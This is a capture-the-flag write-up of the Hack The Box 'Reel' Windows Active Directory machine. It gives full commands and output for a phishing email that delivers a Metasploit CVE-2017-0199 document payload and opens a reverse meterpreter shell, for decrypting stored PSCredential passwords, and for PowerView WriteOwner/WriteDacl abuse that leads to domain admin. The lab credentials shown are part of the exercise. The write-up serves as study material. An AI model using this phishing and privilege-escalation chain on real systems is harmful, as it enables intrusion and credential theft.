---
title: Reel
summary: Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers FTP (21), SMB (139,445), Phishing leads to user compromise.
date: 2026-04-09
tags: [Hack The Box, Active Directory, Windows]
difficulty: hard
os: Windows
url: https://app.hackthebox.com/machines/Reel
author: Ethan Bauer
author_url: https://github.com/ethanbauer10
source: https://github.com/ethanbauer10/Obsidian/blob/main/HackTheBox/Reel%20%5BHard%20-%20AD%5D/Reel%20%5BAD%5D%20%5BHard%5D.md
---

# Reel
## Host file setup
```python
sudo nxc smb 10.129.16.113 --generate-hosts-file /etc/hosts                                                 
SMB         10.129.16.113   445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
```
- Null auth is enabled
- SMBv1
- SMB signing enabled

## Enumeration
### Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn reel.htb.local         
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 11:18 -0400
Nmap scan report for reel.htb.local (10.129.16.113)
Host is up (0.014s latency).
rDNS record for 10.129.16.113: REEL.HTB.LOCAL
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
25/tcp    open  smtp
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
49159/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.70 seconds
```
Interesting port setup for a windows machine
### Nmap
```python
nmap -p 21,22,25,135,139,445,593,49159 -A --min-rate=2000 -sT -Pn reel.htb.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-09 11:20 -0400
Stats: 0:03:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.91% done; ETC: 11:24 (0:00:00 remaining)
Nmap scan report for reel.htb.local (10.129.16.113)
Host is up (0.015s latency).
rDNS record for 10.129.16.113: REEL.HTB.LOCAL

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## FTP (21)
From the nmap scan i know the service allows anonymous logon

```python
ftp reel.htb.local                                   
Connected to REEL.HTB.LOCAL.
220 Microsoft FTP Service
Name (reel.htb.local:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||41001|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM       <DIR>          documents
226 Transfer complete.
ftp> cd documents 
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||41002|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
226 Transfer complete.
```
Ill transfer these files to my machine

Cant write anywhere here

### AppLocker.docx
```python
AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
```

### readme.txt
```python
cat readme.txt                                                                    
please email me any rtf format procedures - I'll review and convert.

new format / converted documents will be saved here.
```

### Windows Event Forwarding.docx
```python

# get winrm config

winrm get winrm/config


# gpo config

O:BAG:SYD:(A;;0xf0005;;;SY)(A;;0x5;;;BA)(A;;0x1;;;S-1-5-32-573)(A;;0x1;;;NS)		// add to GPO
Server=http://WEF.HTB.LOCAL:5985/wsman/SubscriptionManager/WEC,Refresh=60	// add to GPO (60 seconds)

on source computer: gpupdate /force

# prereqs

start Windows Remote Management service on source computer
add builtin\network service account to "Event Log Readers" group on collector server

# list subscriptions / export

C:\Windows\system32>wecutil es > subs.txt

# check subscription status

C:\Windows\system32>wecutil gr "Account Currently Disabled"

Subscription: Account Currently Disabled
        RunTimeStatus: Active
        LastError: 0
        EventSources:
                LAPTOP12.HTB.LOCAL
                        RunTimeStatus: Active
                        LastError: 0
                        LastHeartbeatTime: 2017-07-11T13:27:00.920


# change pre-rendering setting in multiple subscriptions

for /F "tokens=*" %i in (subs.txt) DO wecutil ss "%i" /cf:Events


# export subscriptions to xml

for /F "tokens=*" %i in (subs.txt) DO wecutil gs "%i" /f:xml >> "%i.xml"

# import subscriptions from xml

wecutil cs "Event Log Service Shutdown.xml"
wecutil cs "Event Log was cleared.xml"

# if get error "The locale specific resource for the desired message is not present", change subscriptions to Event format (won't do any hard running command even if they already are in this format)

1.

for /F "tokens=*" %i in (subs.txt) DO wecutil ss "%i" /cf:Events

2.

Under Windows Regional Settings, on the Formats tab, change the format to "English (United States)"

# check subscriptions are being created on the source computer

Event Log: /Applications and Services Logs/Microsoft/Windows/Eventlog-ForwardingPlugin/Operational


#### troubleshooting WEF

collector server -> subscription name -> runtime status

gpupdate /force (force checkin, get subscriptions)

check Microsoft/Windows/Eventlog-ForwardingPlugin/Operational for errors

```

## SMB (139,445)
So null auth is enabled but cannot use it to enumerate shares or groups

Guest account is disabled

## Phishing leads to user compromise
So im thinking that if SMTP is open i might be able to send emails and ive already been given a hint for sending an rtf file for conversion!

```python
exiftool Windows\ Event\ Forwarding.docx 
ExifTool Version Number         : 13.50
File Name                       : Windows Event Forwarding.docx
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2017:10:31 17:13:23-04:00
File Access Date/Time           : 2026:04:09 11:26:45-04:00
File Inode Change Date/Time     : 2026:04:09 11:26:45-04:00
File Permissions                : -rw-rw-r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x82872409
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
Template                        : Normal.dotm
Total Edit Time                 : 5 minutes
Pages                           : 2
Words                           : 299
Characters                      : 1709
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 14
Paragraphs                      : 4
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : 
Links Up To Date                : No
Characters With Spaces          : 2004
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 14.0000
```
Running exiftool on one of the documents i find an email address

### Ineteracting with SMTP
```python
telnet 10.129.16.113 25
Trying 10.129.16.113...
Connected to 10.129.16.113.
Escape character is '^]'.
220 Mail Service ready
HELO dmuhackers.com
250 Hello.
MAIL FROM: <ethan@dmuhackers.com>
250 OK
RCPT TO: <nico@megabank.com>
250 OK
```
Looks to be a valid email address

After doing some research on RTF phishing exploits i find metasploit has a module for the associated CVE `CVE-2017-0199`

## Meterpreter session as `nico`
```python
msf exploit(windows/fileformat/office_word_hta) > options

Module options (exploit/windows/fileformat/office_word_hta):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.doc          yes       The file name.
   SRVHOST   10.10.14.90      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT   8080             yes       The local port to listen on.
   SRVSSL    false            no        Negotiate SSL/TLS for local server connections
   SSL       false            no        Negotiate SSL for incoming connections
   SSLCert                    no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH   default.hta      yes       The URI to use for the HTA file


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.90      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word



View the full module info with the info, or info -d command.

msf exploit(windows/fileformat/office_word_hta) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit(windows/fileformat/office_word_hta) > 
[*] Started reverse TCP handler on 10.10.14.90:4444 
[+] msf.doc stored at /home/kali/.msf4/local/msf.doc
[*] Using URL: http://10.10.14.90:8080/default.hta
[*] Server started.
```
Ive configured metasploit with an lhost and lport to connect back to and also set the srvhost to my ip where the malicious attachment will be hosted!

```python
sendEmail -f IT@megabank.com -t nico@megabank.com -a /home/kali/.msf4/local/msf.doc -u 'Urgent Action Required!' -m 'Please find attached document for more details!' -s 10.129.16.113
Apr 09 11:59:28 kali sendEmail[81454]: Email was sent successfully!
```
This has sent the emai

```python
msf exploit(windows/fileformat/office_word_hta) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf exploit(windows/fileformat/office_word_hta) > 
[*] Started reverse TCP handler on 10.10.14.90:4444 
[+] msf.doc stored at /home/kali/.msf4/local/msf.doc
[*] Using URL: http://10.10.14.90:8080/default.hta
[*] Server started.
[*] Sending stage (196678 bytes) to 10.129.16.113
[*] Meterpreter session 1 opened (10.10.14.90:4444 -> 10.129.16.113:50282) at 2026-04-09 11:59:43 -0400
```
Now i have a meterpreter session as `nico`

```python
msf exploit(windows/fileformat/office_word_hta) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: HTB\nico
meterpreter > 
```
Shell as `nico`

From here i can get the user flag at `C:\Users\nico\Desktop`

## Compromising `Tom`
```python
cat cred.xml  
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```
Found a file inside `nico` desktop called `cred.xml`

Referenced in the file `pscredential` tells me this could be using `Import-CliXml` and `Export-CliXml` which means i can use those to retrieve the plaintext password

```python
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"


UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
Found a password!

```python
nxc smb reel.htb.local -u 'tom' -p '1ts-mag1c!!!'   
SMB         10.129.16.113   445    REEL             [*] Windows Server 2012 R2 Standard 9600 x64 (name:REEL) (domain:HTB.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.16.113   445    REEL             [+] HTB.LOCAL\tom:1ts-mag1c!!!
```
This user is compromised

```python
nxc ssh reel.htb.local -u 'tom' -p '1ts-mag1c!!!'     
SSH         10.129.16.113   22     reel.htb.local   [*] SSH-2.0-OpenSSH_7.6
SSH         10.129.16.113   22     reel.htb.local   [+] tom:1ts-mag1c!!!  Windows - Shell access!
```
This user has access over SSH

### SSH access as `tom`
```python
ssh tom@reel.htb.local                        
The authenticity of host 'reel.htb.local (10.129.16.113)' can't be established.
ED25519 key fingerprint is: SHA256:fIZnS9nEVF3o86fEm/EKspTgedBr8TvFR0i3Pzk40EQ
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'reel.htb.local' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tom@reel.htb.local's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

tom@REEL C:\Users\tom>
```
I now have access via SSH

An alternative could have been to upload RunAsCs via meterpreter session then i could execute commands as `tom`

Found an interesting directory in toms desktop called `AD Audit` inside i find a note as well as powerview.ps1 and some bloodhound collection tools

#### note.txt
```python
scp tom@reel.htb.local:C:/Users/tom/Desktop/AD\ Audit/note.txt .
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tom@reel.htb.local's password: 
note.txt
```
Ive used scp to copy it to my machine

```python
cat note.txt  
Findings:

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).

Maybe we should re-run Cypher query against other groups we've created.
```
Maybe a hint to try and run bloodhound on here!

Im going to try and run bloodhound on here ill upload sharphound using scp, since this is an older machine the collector may be out of date so ill upload the new one!

#### acls.csv

Found another file in the same location ill transfer it to my machine with scp

```python
scp tom@reel.htb.local:C:/Users/tom/Desktop/AD\ Audit/BloodHound/Ingestors/acls.csv .
```
This transferred the file

```python
cat acls.csv | grep tom                                                                                                                        
"tom@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"tom@HTB.LOCAL","USER","","Enterprise Admins@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"tom@HTB.LOCAL","USER","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"tom@HTB.LOCAL","USER","","Local System@HTB.LOCAL","USER","GenericAll","","AccessAllowed","False"
"tom@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","Owner","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"
```
So it looks like the most interesting part from this output is that `tom` has `writeowner` over `claire`

## Granting full control over `claire` as `tom`

https://www.hackingarticles.in/abusing-ad-dacl-writeowner/

Ill use this article to abuse this!

```python
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Import-Module .\PowerView.ps1                                                      
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainObjectOwner -Identity 'claire' -OwnerIdentity 'tom'
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "claire" -PrincipalIdentity "tom"
```
This imported powerview which was conveniently already there for me, then made `tom` the owner of `claire` from there i could give myself full control over `claire`

```python
PS C:\Users\tom\Desktop\AD Audit\BloodHound> $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force           
PS C:\Users\tom\Desktop\AD Audit\BloodHound> Set-DomainUserPassword -Identity 'claire' -AccountPassword $NewPassword
```
Now i have GenericAll i can just change the password like ive done here

```python
ssh claire@reel.htb.local                                       
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
claire@reel.htb.local's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

claire@REEL C:\Users\claire> 
```
Now i have access to `claire`

### Analysis of `claire` rights
```python
cat acls.csv | grep claire
"Backup_Admins@HTB.LOCAL","GROUP","","claire@HTB.LOCAL","USER","WriteDacl","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","tom@HTB.LOCAL","USER","WriteOwner","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","Account Operators@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","Local System@HTB.LOCAL","USER","GenericAll","","AccessAllowed","False"
"claire@HTB.LOCAL","USER","","Exchange Windows Permissions@HTB.LOCAL","GROUP","ExtendedRight","User-Force-Change-Password","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteProperty","Member","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Exchange Windows Permissions@HTB.LOCAL","GROUP","WriteDacl","","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Enterprise Admins@HTB.LOCAL","GROUP","GenericAll","","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","True"
"claire@HTB.LOCAL","USER","","Local System@HTB.LOCAL","USER","Owner","","AccessAllowed","False"
"claire_da@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"claire_da@HTB.LOCAL","USER","","Enterprise Admins@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"claire_da@HTB.LOCAL","USER","","Administrators@HTB.LOCAL","GROUP","WriteDacl WriteOwner","","AccessAllowed","False"
"claire_da@HTB.LOCAL","USER","","Local System@HTB.LOCAL","USER","GenericAll","","AccessAllowed","False"
"claire_da@HTB.LOCAL","USER","","Domain Admins@HTB.LOCAL","GROUP","Owner","","AccessAllowed","False"
```
As seen here at the top of the output `claire` has WriteDacl over the backup admins group

So the same thing really i can grant myself GenericAll with WriteDacl then add myself to backup admins then from there im assuming i can backup SAM and SYSTEM

## Adding `claire` to `backup_admins`

https://www.hackingarticles.in/abusing-ad-dacl-writedacl/

Ill use this article to help with this

First ill need to upload PowerView to claire

```python
scp PowerView.ps1 claire@reel.htb.local:C:/Users/claire/Desktop/
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
claire@reel.htb.local's password: 
PowerView.ps1
```
Now its on her desktop i can give GenericAll to myself over the backup admins group

```python
PS C:\Users\claire\Desktop> powershell -ep bypass                                                                               
Windows PowerShell                                                                                                              
Copyright (C) 2014 Microsoft Corporation. All rights reserved.                                                                  

PS C:\Users\claire\Desktop> Import-Module .\PowerView.ps1
PS C:\Users\claire\Desktop> Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Backup_Admins" -PrincipalIdentity "claire"
```
Now i should have GenericAll over the group now i can add myself to it

```python
PS C:\Users\claire\Desktop> net group "Backup_Admins" claire /add /domain                                                       
The command completed successfully.
```
Now im in the group

```python
PS C:\Users\claire> net user claire                                                                                             
User name                    claire                                                                                             
Full Name                    Claire Danes                                                                                       
Comment                                                                                                                         
User's comment                                                                                                                  
Country/region code          000 (System Default)                                                                               
Account active               Yes                                                                                                
Account expires              Never                                                                                              

Password last set            4/9/2026 6:28:40 PM                                                                                
Password expires             Never                                                                                              
Password changeable          4/10/2026 6:28:40 PM                                                                               
Password required            Yes                                                                                                
User may change password     Yes                                                                                                

Workstations allowed         All                                                                                                
Logon script                                                                                                                    
User profile                                                                                                                    
Home directory                                                                                                                  
Last logon                   4/9/2026 6:28:46 PM                                                                                

Logon hours allowed          All                                                                                                

Local Group Memberships      *Hyper-V Administrator                                                                             
Global Group memberships     *Backup_Admins        *Domain Users                                                                
                             *MegaBank_Users       *DR_Site                                                                     
                             *Restrictions                                                                                      
The command completed successfully.
```
Now im in the Backup_Admins group

```python
PS C:\Users\Administrator\Desktop\Backup Scripts> type BackupScript.ps1                                                         
# admin password                                                                                                                
$password="Cr4ckMeIfYouC4n!"       
...[SNIP]...
```
So i can read some of the administrator files and found this backup script with hardcoded credentials


## Domain admin!
```python
ssh administrator@reel.htb.local                                
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
administrator@reel.htb.local's password: 

Microsoft Windows [Version 6.3.9600]                                                                                            
(c) 2013 Microsoft Corporation. All rights reserved.                                                                            

administrator@REEL C:\Users\Administrator>cd Desktop                                                                            

administrator@REEL C:\Users\Administrator\Desktop>dir                                                                           
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CEBA-B613                                                                                              

 Directory of C:\Users\Administrator\Desktop                                                                                    

21/01/2018  15:56    <DIR>          .                                                                                           
21/01/2018  15:56    <DIR>          ..                                                                                          
02/11/2017  22:47    <DIR>          Backup Scripts                                                                              
09/04/2026  16:16                34 root.txt                                                                                    
               1 File(s)             34 bytes                                                                                   
               3 Dir(s)   4,976,431,104 bytes free                                                                              

administrator@REEL C:\Users\Administrator\Desktop>type root.txt                                                                 
||ad5081635cb4e7da7f07b7c8cce43e9a||

administrator@REEL C:\Users\Administrator\Desktop>whoami /priv                                                                  

PRIVILEGES INFORMATION                                                                                                          
----------------------                                                                                                          

Privilege Name                  Description                                                    State                            
=============================== ============================================================== =======                          
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process                             Enabled                          
SeMachineAccountPrivilege       Add workstations to domain                                     Enabled                          
SeSecurityPrivilege             Manage auditing and security log                               Enabled                          
SeTakeOwnershipPrivilege        Take ownership of files or other objects                       Enabled                          
SeLoadDriverPrivilege           Load and unload device drivers                                 Enabled                          
SeSystemProfilePrivilege        Profile system performance                                     Enabled                          
SeSystemtimePrivilege           Change the system time                                         Enabled                          
SeProfileSingleProcessPrivilege Profile single process                                         Enabled                          
SeIncreaseBasePriorityPrivilege Increase scheduling priority                                   Enabled                          
SeCreatePagefilePrivilege       Create a pagefile                                              Enabled                          
SeBackupPrivilege               Back up files and directories                                  Enabled                          
SeRestorePrivilege              Restore files and directories                                  Enabled                          
SeShutdownPrivilege             Shut down the system                                           Enabled                          
SeDebugPrivilege                Debug programs                                                 Enabled                          
SeSystemEnvironmentPrivilege    Modify firmware environment values                             Enabled                          
SeChangeNotifyPrivilege         Bypass traverse checking                                       Enabled                          
SeRemoteShutdownPrivilege       Force shutdown from a remote system                            Enabled                          
SeUndockPrivilege               Remove computer from docking station                           Enabled                          
SeEnableDelegationPrivilege     Enable computer and user accounts to be trusted for delegation Enabled                          
SeManageVolumePrivilege         Perform volume maintenance tasks                               Enabled                          
SeImpersonatePrivilege          Impersonate a client after authentication                      Enabled                          
SeCreateGlobalPrivilege         Create global objects                                          Enabled                          
SeIncreaseWorkingSetPrivilege   Increase a process working set                                 Enabled                          
SeTimeZonePrivilege             Change the time zone                                           Enabled                          
SeCreateSymbolicLinkPrivilege   Create symbolic links                                          Enabled                          

administrator@REEL C:\Users\Administrator\Desktop>
```
Domain Admin!
